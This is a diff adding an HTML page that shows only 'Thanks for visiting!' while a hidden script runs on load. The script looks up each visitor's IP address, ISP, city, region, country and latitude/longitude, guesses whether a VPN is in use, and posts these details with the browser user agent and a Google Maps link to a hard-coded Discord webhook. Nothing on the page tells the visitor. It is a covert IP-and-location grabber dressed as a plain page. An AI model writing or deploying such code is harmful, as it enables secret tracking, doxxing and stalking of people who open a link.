@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visiting.io</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            color: #333;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Thanks for visiting!</h1>
+
+    <script>
+        async function sendToDiscord(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1342844997820743691/yw_JBEvEdaHG4Q__b6Sfpe3J-lorhwyegqN9ffnS7wWKC0ANrjRasbCNV0bNaG4KN7Mq";  
+
+            const payload = {
+                content: `🚨 **New Visitor Tracked!**\n\n` +
+                         `**IP:** \`${data.ip}\`\n` +
+                         `**ISP:** \`${data.isp}\`\n` +
+                         `**VPN:** \`${data.is_vpn}\`\n` +
+                         `**Location:** \`${data.city}, ${data.region}, ${data.country}\`\n` +
+                         `**Latitude:** \`${data.latitude}\`\n` +
+                         `**Longitude:** \`${data.longitude}\`\n` +
+                         `[📍 View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n` +
+                         `**User-Agent:** \`${data.user_agent}\``
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Discord Webhook Error:", error);
+            }
+        }
+
+        async function getUserData() {
+            try {
+                let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+
+                let userData = {
+                    ip: ipData.ip || "Unknown",
+                    city: ipData.city || "Unknown",
+                    region: ipData.region || "Unknown",
+                    country: ipData.country_name || "Unknown",
+                    latitude: ipData.latitude || "Unknown",
+                    longitude: ipData.longitude || "Unknown",
+                    isp: ipData.org || "Unknown",
+                    user_agent: navigator.userAgent,
+                    is_vpn: (ipData.org && ipData.org.toLowerCase().includes("vpn")) ? "Yes" : "No"
+                };
+
+                sendToDiscord(userData);
+            } catch (error) {
+                console.error("Location API Error:", error);
+            }
+        }
+
+        getUserData();
+    </script>
+
+</body>
+</html>
